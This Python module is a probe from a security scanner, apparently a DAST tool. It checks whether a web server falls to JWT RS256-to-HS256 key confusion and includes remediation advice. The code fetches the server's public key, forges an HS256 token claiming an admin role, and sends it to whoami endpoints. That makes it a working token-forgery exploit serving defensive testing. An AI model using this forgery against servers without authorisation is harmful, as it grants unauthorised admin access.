#!/usr/bin/env python3
# Author: Tim Rice <tim.j.rice@hackrange.com>
# Part of nextgen-dast. See README.md for license and overall architecture.
"""
Authentication: JWT RSA → HMAC key-confusion attack.

Many JWT libraries select the verification algorithm from the token's
own header rather than from the verifier's policy. When the server
issues RS256 tokens (signed with an RSA private key, verified with the
public key) but the verifier accepts whatever algorithm the *token*
declares, an attacker can:

  1. Fetch the public key (it is meant to be public — /jwt.pub,
     /.well-known/jwks.json, /encryptionkeys/jwt.pub on Juice Shop).
  2. Forge a token with header `alg=HS256`, payload of their choice.
  3. HMAC-SHA256-sign it using the public key bytes as the secret.
  4. Submit it. The verifier sees `HS256`, hands the public key (which
     it would have used for RS256 verification) to the HMAC function,
     and the signature checks out.

This is the textbook "key confusion" attack. It is invisible to
pattern scanners because the only network signature is "a JWT was
issued and then accepted" — exactly what normal traffic looks like.

Detection signal: forge an HS256-signed JWT keyed with a fetched RSA
public key, set a marker email claim, send to a "tell me who I am"
endpoint, look for the marker echoed in the response. Marker is a
random string per run so a hit is unambiguous.

Tested against:
  + OWASP Juice Shop  /encryptionkeys/jwt.pub is public; current build
                      enforces RS256 on whoami, so the forged HS256
                      token is rejected and the probe correctly returns
                      validated=False.
  + nginx default site → validated=False
  + Would fire on any app that ships an exposed jwt.pub AND accepts
    `alg` from the token header.
"""
from __future__ import annotations

import base64
import hashlib
import hmac
import json
import secrets
import sys
from pathlib import Path
from urllib.parse import urljoin, urlparse

sys.path.insert(0, str(Path(__file__).parent.parent))
from lib import Probe, Verdict, SafeClient   # noqa: E402

# Where the public key tends to live. Order matters — the most likely
# locations come first so we exit with a key as fast as possible.
PUBLIC_KEY_PATHS = (
    "/encryptionkeys/jwt.pub",      # Juice Shop's literal path
    "/.well-known/jwks.json",       # OAuth / OIDC standard location
    "/jwks.json",
    "/.well-known/openid-configuration",  # discovery doc may pin a jwks_uri
    "/jwt.pub",
    "/keys/jwt.pub",
    "/public.pem",
)

# Whoami endpoints to fire the forged token at.
WHOAMI_PATHS = (
    "/rest/user/whoami",
    "/api/me",
    "/api/users/me",
    "/me",
    "/api/v1/me",
)


def _b64url(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode("ascii")


def _looks_like_pem(text: str) -> str | None:
    """Return the PEM block (header to footer inclusive) when text holds
    a single PEM-encoded public key, else None. We sign using the
    verbatim PEM bytes — the SAME bytes the server will hand its
    HMAC routine — so trimming whitespace correctly matters."""
    if "-----BEGIN " not in text or "-----END " not in text:
        return None
    start = text.index("-----BEGIN ")
    end = text.index("-----END ")
    end_line_end = text.find("\n", end)
    if end_line_end == -1:
        end_line_end = len(text)
    block = text[start:end_line_end].strip()
    return block if block else None


def _build_hs256_token(secret_bytes: bytes, email: str) -> str:
    """Construct a JWT with alg=HS256, payload carrying our marker, and
    sign it with HMAC-SHA256 keyed on the supplied bytes (the public-key
    PEM, in this attack)."""
    header  = _b64url(json.dumps({"alg": "HS256", "typ": "JWT"}).encode())
    payload = _b64url(json.dumps({
        "email": email,
        "data": {"email": email, "role": "admin"},
        "role": "admin",
        "iat": 0,
    }).encode())
    signing_input = f"{header}.{payload}".encode("ascii")
    sig = hmac.new(secret_bytes, signing_input, hashlib.sha256).digest()
    return f"{header}.{payload}.{_b64url(sig)}"


class JwtRsaHmacConfusionProbe(Probe):
    name = "auth_jwt_rsa_hmac_confusion"
    summary = ("Detects RS256→HS256 JWT key-confusion: server accepts "
               "a token HMAC-signed with its own public key.")
    safety_class = "read-only"

    def add_args(self, parser):
        parser.add_argument(
            "--key-path", action="append", default=[],
            help="Additional public-key path to try (repeatable).")
        parser.add_argument(
            "--whoami-path", action="append", default=[],
            help="Additional 'tell me who I am' path (repeatable).")

    def run(self, args, client: SafeClient) -> Verdict:
        if not args.url:
            return Verdict(ok=False, error="--url is required")
        parsed = urlparse(args.url)
        origin = f"{parsed.scheme}://{parsed.netloc}"
        key_paths    = list(PUBLIC_KEY_PATHS) + list(args.key_path or [])
        whoami_paths = list(WHOAMI_PATHS)     + list(args.whoami_path or [])

        # Step 1: locate a public key the server will trust.
        evidence: dict = {"origin": origin, "key_attempts": [],
                          "whoami_attempts": []}
        pem_block: str | None = None
        pem_path:  str | None = None
        for p in key_paths:
            r = client.request("GET", urljoin(origin, p))
            row = {"path": p, "status": r.status, "size": r.size}
            if r.status == 200 and r.body:
                cand = _looks_like_pem(r.text)
                if cand:
                    row["pem_found"] = True
                    pem_block, pem_path = cand, p
                    evidence["key_attempts"].append(row)
                    break
            evidence["key_attempts"].append(row)

        if not pem_block:
            return Verdict(
                validated=False, confidence=0.85,
                summary=(f"Refuted: no public PEM key located at the "
                         f"{len(evidence['key_attempts'])} canonical "
                         f"paths on {origin}. Without the public key "
                         "the key-confusion attack has no input."),
                evidence=evidence,
            )

        # Step 2: forge a token using the PEM bytes as the HMAC secret.
        marker = f"jwt-confusion-{secrets.token_hex(6)}@dast.test"
        token = _build_hs256_token(pem_block.encode("utf-8"), marker)
        evidence["pem_path"] = pem_path
        evidence["marker"]   = marker

        # Step 3: replay the forged token and look for the marker echo.
        confirmed: dict | None = None
        for p in whoami_paths:
            url = urljoin(origin, p)
            r = client.request("GET", url, headers={
                "Authorization": f"Bearer {token}",
            })
            row: dict = {"path": p, "status": r.status, "size": r.size}
            if r.status == 200 and r.body and marker in r.text:
                row["marker_echoed"] = True
                confirmed = row
                evidence["whoami_attempts"].append(row)
                break
            evidence["whoami_attempts"].append(row)

        if confirmed:
            return Verdict(
                validated=True, confidence=0.97,
                summary=(f"Confirmed: server at {origin}{confirmed['path']} "
                         f"accepts an HS256 JWT signed with the public "
                         f"key from {pem_path}. The forged email "
                         f"{marker!r} appeared in the response — "
                         "classic RS256→HS256 key-confusion."),
                evidence={**evidence, "confirmed": confirmed},
                severity_uplift="critical",
                remediation=(
                    "Pin the verification algorithm explicitly. Pass "
                    "an `algorithms` allowlist that contains ONLY the "
                    "asymmetric algorithm you actually use:\n"
                    "  - jsonwebtoken (Node): "
                    "    jwt.verify(token, pubKey, { algorithms: ['RS256'] });\n"
                    "  - PyJWT: jwt.decode(token, pubKey, "
                    "    algorithms=['RS256'])\n"
                    "Pair with rotating the signing keypair — every "
                    "token issued during the exposure window may have "
                    "been forged. The public key itself does not need "
                    "to be removed (it is meant to be public); the fix "
                    "is in the verifier."),
            )

        return Verdict(
            validated=False, confidence=0.85,
            summary=(f"Refuted: located public key at "
                     f"{origin}{pem_path}, forged HS256 token keyed on "
                     f"the PEM bytes, fired at {len(whoami_paths)} "
                     "whoami endpoints — none echoed the forged marker."),
            evidence=evidence,
        )


if __name__ == "__main__":
    JwtRsaHmacConfusionProbe().main()
